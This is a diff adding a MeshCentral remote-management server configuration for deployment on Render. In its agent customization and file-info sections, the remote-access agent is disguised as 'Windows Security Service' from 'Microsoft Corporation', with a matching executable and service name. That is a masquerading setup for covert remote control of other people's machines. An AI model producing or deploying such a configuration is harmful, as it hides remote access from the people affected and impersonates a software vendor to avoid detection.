@@ -1,0 +1,52 @@
+{
+  "$schema": "https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json",
+  "__comment1__": "Render deployment config - uses environment variables for dynamic values",
+  "__comment2__": "Set MESHCENTRAL_DOMAIN and MESHCENTRAL_CERT in Render environment variables",
+  "settings": {
+    "cert": "${MESHCENTRAL_DOMAIN}",
+    "WANonly": true,
+    "port": 443,
+    "aliasPort": 443,
+    "redirPort": 80,
+    "redirAliasPort": 80,
+    "dbCleanup": 30,
+    "noLocalDiscovery": true,
+    "noMqtt": true,
+    "noFirebase": true,
+    "noAmt": true,
+    "noMps": true,
+    "dataPath": "/var/data/meshcentral"
+  },
+  "domains": {
+    "": {
+      "title": "ADP Agent",
+      "minify": false,
+      "compression": true,
+      "noAdminLoginStats": true,
+      "noAgentUpdate": false,
+      "agentCustomization": {
+        "displayName": "Windows Security Service",
+        "description": "Windows Security Service",
+        "companyName": "Microsoft Corporation",
+        "serviceName": "WindowsSecurityService",
+        "fileName": "WindowsSecurityService"
+      },
+      "agentFileInfo": {
+        "filedescription": "Windows Security Service",
+        "fileversion": "1.0.0.0",
+        "internalname": "WindowsSecurityService",
+        "legalcopyright": "Microsoft Corporation",
+        "originalfilename": "WindowsSecurityService.exe",
+        "productname": "Windows Security Service",
+        "productversion": "1.0"
+      }
+    }
+  },
+  "letsencrypt": {
+    "__comment__": "Render provides HTTPS automatically. Let's Encrypt will use Render's domain.",
+    "email": "ajayajay142018@gmail.com",
+    "names": "${MESHCENTRAL_DOMAIN}",
+    "skipChallengeVerification": false,
+    "production": true
+  }
+}
